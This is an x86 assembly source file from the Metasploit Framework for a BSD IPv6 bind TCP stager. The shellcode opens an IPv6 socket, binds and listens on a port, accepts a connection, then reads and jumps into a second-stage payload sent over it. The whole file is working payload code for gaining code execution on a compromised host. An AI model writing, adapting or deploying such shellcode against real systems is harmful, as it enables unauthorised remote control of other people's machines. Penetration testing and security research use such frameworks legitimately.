;;
; 
;        Name: stager_sock_bind_ipv6
;   Qualities: Can Have Nulls
;     Version: $Revision: 1628 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSD portbind over IPv6 TCP stager.
;
; Meta-Information:
;
; meta-shortname=BSD Bind TCP Stager
; meta-description=Listen on a port for a connection and run a second stage
; meta-authors=skape <mmiller [at] hick.org>, vlad902 <vlad902 [at] gmail.com>, hdm <hdm [at] metasploit.com>
; meta-os=bsd
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=bind
; meta-name=bind_tcp_ipv6
; meta-basemod=Msf::PayloadComponent::BindConnection
; meta-offset-lport=26
;;
BITS   32
GLOBAL main

main:

socket:
	xor eax, eax
	push eax        ;   Protocol: (IP=0)
	inc eax
	push eax        ;       Type: (SOCK_STREAM=1)
	push byte 28    ;     Domain: (PF_INET6=28)
	push byte 97
	pop  eax        ; socket()
	push eax        ; padding
	int  0x80
	mov ebx, eax    ; save socket
	
	xor edx, edx

	push edx	          ; uint32_t        sin6_scope_id;  /* scope zone index */			
	push edx              ; struct in6_addr sin6_addr;      /* IP6 address */
	push edx
	push edx
	push edx
	push edx              ; uint32_t        sin6_flowinfo;  /* IP6 flow information */
	push dword 0xbfbf1c1c      
	                      ; in_port_t       sin6_port;      /* Transport layer port # */
	                      ; uint8_t         sin6_len;       /* length of this struct */
                          ; sa_family_t     sin6_family;    /* AF_INET6 */
			
	mov ecx, esp

bind:
	push byte 28
	push ecx
	push eax
	push byte 104
	pop  eax
	push eax ; padding
	int  0x80

listen:
	mov  al, 106
	int  0x80

accept:
	push edx
	push ebx
%ifndef USE_SINGLE_STAGE
	mov  dh, 0x10
%endif
	push edx
	mov  al, 30
	int  0x80

%ifndef USE_SINGLE_STAGE

read:
	push ecx
	push eax
	push ecx
%ifdef FD_REG_EBX
	xchg eax, ebx
%else
	xchg eax, edi
%endif
	push byte 0x3
	pop  eax
	int  0x80
	ret

%else

%ifdef FD_REG_EBX
	xchg eax, ebx
%else
	xchg eax, edi
%endif

%endif
